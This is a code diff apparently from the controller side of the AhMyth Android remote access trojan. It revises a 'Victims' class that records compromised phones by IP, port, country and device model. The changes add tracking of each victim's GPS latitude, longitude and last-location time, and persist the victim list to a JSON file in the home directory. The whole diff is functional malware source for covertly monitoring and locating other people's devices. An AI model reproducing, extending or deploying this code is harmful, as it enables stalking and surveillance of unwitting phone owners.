@@ -6,44 +6,28 @@
      this.manf = manf;
      this.model = model;
      this.release = release;
+     this.lat = null;
+     this.lng = null;
+     this.locationEnabled = false;
+     this.lastLocationAt = null;
  };
 
-var fs = require('fs-extra');
-var path = require('path');
-var homeDir = require('homedir');
+ const fs = require("fs-extra");
+ const path = require("path");
+ const homeDir = require("homedir");
+ const CONSTANTS = require(__dirname + '/../Constants');
 
-class Victims {
+ const dataPath = path.join(homeDir(), CONSTANTS.dataDir);
+ const victimsFile = path.join(dataPath, 'victims.json');
+
+
+
+
+ class Victims {
      constructor() {
          this.victimList = {};
          this.instance = this;
-         this.dataDir = path.join(homeDir(), '.ahmyth');
-         this.dataFile = path.join(this.dataDir, 'victims.json');
-         try {
-             fs.ensureDirSync(this.dataDir);
-         } catch (err) {
-             console.error('Error ensuring data directory:', err);
-         }
-     }
-
-     saveVictims() {
-         try {
-             // Save only non-socket data (socket objects can't be serialized)
-             var dataToSave = {};
-             for (var id in this.victimList) {
-                 var victim = this.victimList[id];
-                 dataToSave[id] = {
-                     ip: victim.ip,
-                     port: victim.port,
-                     country: victim.country,
-                     manf: victim.manf,
-                     model: victim.model,
-                     release: victim.release
-                 };
-             }
-             fs.writeFileSync(this.dataFile, JSON.stringify(dataToSave, null, 2));
-         } catch (err) {
-             console.error('Error saving victims:', err);
-         }
+         this.loadVictims();
      }
 
      addVictim(socket, ip, port, country, manf, model, release, id) {
@@ -59,6 +43,22 @@ class Victims {
          return -1;
      }
 
+     updateLocation(id, lat, lng, enable) {
+         if (this.victimList[id] == null) return;
+         this.victimList[id].lat = lat;
+         this.victimList[id].lng = lng;
+         this.victimList[id].locationEnabled = enable;
+         this.victimList[id].lastLocationAt = new Date().toISOString();
+         this.saveVictims();
+     }
+
+     getVictimIdBySocket(socket) {
+         for (let id in this.victimList) {
+             if (this.victimList[id].socket === socket) return id;
+         }
+         return null;
+     }
+
      rmVictim(id) {
          delete this.victimList[id];
          this.saveVictims();
@@ -66,6 +66,51 @@ class Victims {
 
      getVictimList() {
          return this.victimList;
+     }
+
+     saveVictims() {
+         try {
+             fs.ensureDirSync(dataPath);
+             const victimData = {};
+             for (let id in this.victimList) {
+                 const victim = this.victimList[id];
+                 victimData[id] = {
+                     ip: victim.ip,
+                     port: victim.port,
+                     country: victim.country,
+                     manf: victim.manf,
+                     model: victim.model,
+                     release: victim.release,
+                     lat: victim.lat,
+                     lng: victim.lng,
+                     locationEnabled: victim.locationEnabled,
+                     lastLocationAt: victim.lastLocationAt
+                 };
+             }
+             fs.writeFileSync(victimsFile, JSON.stringify(victimData, null, 2), 'utf8');
+         } catch (err) {
+             console.error('Error saving victims:', err);
+         }
+     }
+
+     loadVictims() {
+         try {
+             if (fs.existsSync(victimsFile)) {
+                 const data = fs.readFileSync(victimsFile, 'utf8');
+                 const victimData = JSON.parse(data);
+                 for (let id in victimData) {
+                     const victim = victimData[id];
+                     const victimObj = new Victim(null, victim.ip, victim.port, victim.country, victim.manf, victim.model, victim.release);
+                     if (victim.lat != null) victimObj.lat = victim.lat;
+                     if (victim.lng != null) victimObj.lng = victim.lng;
+                     if (victim.locationEnabled != null) victimObj.locationEnabled = victim.locationEnabled;
+                     if (victim.lastLocationAt != null) victimObj.lastLocationAt = victim.lastLocationAt;
+                     this.victimList[id] = victimObj;
+                 }
+             }
+         } catch (err) {
+             console.error('Error loading victims:', err);
+         }
      }
 
  }
